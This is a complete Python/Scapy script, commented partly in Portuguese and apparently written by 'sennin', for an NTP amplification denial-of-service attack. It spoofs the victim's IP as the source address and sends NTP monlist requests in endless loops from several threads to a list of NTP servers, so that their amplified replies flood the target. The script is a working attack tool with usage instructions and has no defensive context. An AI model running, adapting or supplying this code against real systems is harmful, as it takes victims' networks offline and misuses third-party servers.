#@sennxn
from scapy.all import *
import sys
import threading
import time
import random

def deny():
  
	#Importe os crl tudo
	global ntplist
	global currentserver
	global data
	global target
	ntpserver = ntplist[currentserver]
	currentserver = currentserver + 1 
	packet = IP(dst=ntpserver,src=target)/UDP(sport=random.randint(2000,65535),dport=123)/Raw(load=data) #BUILD IT
	send(packet,loop=1)

def printhelp():
	print "Ataque DOS de amplificação NTP"
	print "By sennin"
	print "Usage ntpdos.py <target ip> <ntpserver list> <number of threads>"
	print "importando a porra toda"
	print "A lista de servidores NTP deve conter apenas um IP por linha"
	print "CERTIFIQUE-SE DE QUE SUA CONTAGEM DE LINHAS É MENOR/IGUAL AO SEU NUMERO DE SERVIDORES"
	exit(0)

try:
	if len(sys.argv) < 4:
		printhelp()
	#Fetch Args
	target = sys.argv[1]
  
	if target in ("help","-h","h","?","--h","--help","/?"):
		printhelp()

	ntpserverfile = sys.argv[2]
	numberthreads = int(sys.argv[3])
	#System for accepting bulk input
	ntplist = []
	currentserver = 0
	with open(ntpserverfile) as f:
	    ntplist = f.readlines()

	#só nao ultrapasse os limites ;)
	if  numberthreads > int(len(ntplist)):
		print "Attack Aborted: More threads than servers"
		print "Next time dont create more threads than servers"
		exit(0)

	#Magic Packet aka NTP v2 Monlist Packet
	data = "\x17\x00\x03\x2a" + "\x00" * 4

	#Hold our threads
	threads = []
	print "Starting to flood: "+ target + " using NTP list: " + ntpserverfile + " With " + str(numberthreads) + " threads"
	print "Use CTRL+C to stop attack"

	#Thread spawner
	for n in range(numberthreads):
	    thread = threading.Thread(target=deny)
	    thread.daemon = True
	    thread.start()
	    threads.append(thread)
      
	print "Enviando..."

	while True:
		time.sleep(1)
except KeyboardInterrupt:
	print("Script Stopped [ctrl + c]... Shutting down")
	# ez
